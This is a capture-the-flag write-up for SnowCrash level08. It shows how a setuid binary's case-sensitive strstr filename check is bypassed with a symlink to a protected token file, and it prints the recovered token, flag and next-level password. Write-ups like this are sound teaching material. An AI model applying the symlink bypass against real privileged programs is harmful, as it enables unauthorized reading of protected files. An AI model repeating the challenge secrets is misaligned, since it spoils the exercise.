# Objective

As `level08`, the goal is to exploit a vulnerability to gain `flag08`'s privileges and read the flag, which is the password for `level09`.

The flag is gained through the command `getflag`, run as `flag08`.

```sh
level08@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```

# Content of home

The folder contains `level08` and `token`.

```sh
level08@SnowCrash:~$ pwd
/home/user/level08

level08@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

### File type

```sh
level08@SnowCrash:~$ file level08 
level08: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xbe40aba63b7faec62e9414be1b639f394098532f, not stripped

level08@SnowCrash:~$ file token 
token: regular file, no read permission
```

### Behavior

```sh
level08@SnowCrash:~$ ./level08
./level08 [file to read]

level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

What would happen with a file we have `access` to?

```sh
level08@SnowCrash:~$ chmod 777 .
level08@SnowCrash:~$ touch good_file.txt
level08@SnowCrash:~$ chmod u+rwx good_file.txt 
level08@SnowCrash:~$ ./level08 good_file.txt 
level08@SnowCrash:~$ cat > good_file.txt 
text

level08@SnowCrash:~$ ./level08 good_file.txt 
text
```

Apparently, `level08` simply opens and prints whatever text is in a file...

... as long as the given path doesn't contain the string `token`.

```sh
level08@SnowCrash:~$ ltrace ./level08 link_to_token 
__libc_start_main(0x8048554, 2, 0xbffff854, 0x80486b0, 0x8048720 <unfinished ...>
strstr("link_to_token", "token")                                                                              = "token"
printf("You may not access '%s'\n", "link_to_token"You may not access 'link_to_token'
)                                                          = 35
exit(1 <unfinished ...>
+++ exited (status 1) +++
```


# Resolution

The check is a naive string match on the path (`strstr`), not on the file actually opened. A symlink whose own name avoids the substring `token`, but which points to the real `token` file, slips past the check while still resolving to the protected file when opened.

Let us create such a link. `strstr` is also case-sensitive, so mixing the case of the forbidden substring, as in `ToKeN` below, is enough by itself to dodge the check, regardless of what surrounds it.

```sh
level08@SnowCrash:~$ setfacl -d -m m::rwx,u::rwx .
level08@SnowCrash:~$ umask 0022
level08@SnowCrash:~$ chmod u+w,o+r .

level08@SnowCrash:~$ ln -s token link_to_the_ToKeN

level08@SnowCrash:~$ ./level08 link_to_the_ToKeN
quif5eloekouj29ke0vouxean
```

Great success!

```sh
level08@SnowCrash:~$ su - flag08
Password: # quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

flag08@SnowCrash:~$ su - level09
Password: # 25749xKZ8L7DkSCwJkT9dyv6f
level09@SnowCrash:~$ 
```